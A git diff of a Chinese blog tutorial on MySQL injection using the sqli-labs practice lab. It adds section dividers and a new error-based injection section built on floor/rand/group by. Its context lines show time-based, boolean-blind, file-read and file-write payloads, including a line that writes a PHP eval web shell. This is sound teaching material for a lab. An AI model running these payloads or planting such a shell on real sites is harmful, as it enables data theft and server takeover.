@@ -1,5 +1,5 @@
 ---
-title:      "关于Mysql注入"
+title:      "关于Mysql注入(一)"
 date:       2020-03-15 04:00:00
 categories: 信息安全
 excerpt_separator: <!--more-->
@@ -7,7 +7,7 @@ latex: true
 tags:
     - sql_injection
 ---
-## <center>基于sqli_lab的sql注入详解</center>
+## <center>基于sqli_lab的sql注入详解(一)</center>
 <!--more-->
 
 ## mysql的目录结构
@@ -20,6 +20,7 @@ tables|table_schema, table_name
 columns|table_schema, table_name, column_name
 
 
+***
 ## 基于报错的SQL注入
 
 ### 以less-1为例
@@ -105,6 +106,7 @@ http://127.0.0.1/sqli/Less-1/?id=1'
    * $\color{red}{返回结果}$  
    ![f9]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f9.png)
 
+***
 ## 关于mysql的注释
 ### 常见注释符
 * #或--+或/**/ 
@@ -114,6 +116,7 @@ http://127.0.0.1/sqli/Less-1/?id=1'
 ![f10]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f10.png)  
 ![f11]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f11.png)
 
+***
 ## 基于时间的延时注入
 ### 以less-9为例
 ![f12]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f12.png) 
@@ -136,6 +139,7 @@ http://127.0.0.1/sqli/Less-9/?id=1' and if(ascii(substr(database(),1,1))=116,1,s
 
 > * 注意payload要加and
 
+***
 ## 布尔盲注
 ### 以less-8为例
 
@@ -161,6 +165,7 @@ http://127.0.0.1/sqli/Less-8/?id=1' and length(database()) < 9 --+
 
 #### 从而确定length(database())=8
 
+***
 ## mysql读文件
 ### 前提
 * 权限够高
@@ -178,6 +183,7 @@ http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,load_file('F:\\flag.txt'),3 
 
 ![f20]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f20.png)
 
+***
 ## mysql写文件
 ### 前提
 * 权限够高
@@ -201,3 +207,21 @@ http://127.0.0.1/sqli/Less-7/?id=-1')) union select 1,2,'<?php eval($_POST["ezy"
 ```
 
 ![f23]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f23.png)
+
+***
+## mysql报错注入
+### 以less-5为例
+![f24]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f24.png)
+
+### 利用 floor(),rand(),group by进行报错注入
+
+```http
+http://192.168.0.104/sqli/Less-5/?id=0' union select 1,2,count(*)  from information_schema.columns group by concat((select table_name from information_schema.tables where table_schema = database() limit 3,1),0x3a,floor(rand(0)*2)) --+
+```
+
+> * 注意只能返回一行数据，所以使用limit
+
+#### 返回结果
+![f25]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f25.png)
+
+> * 通过改变payload爆出其他数据
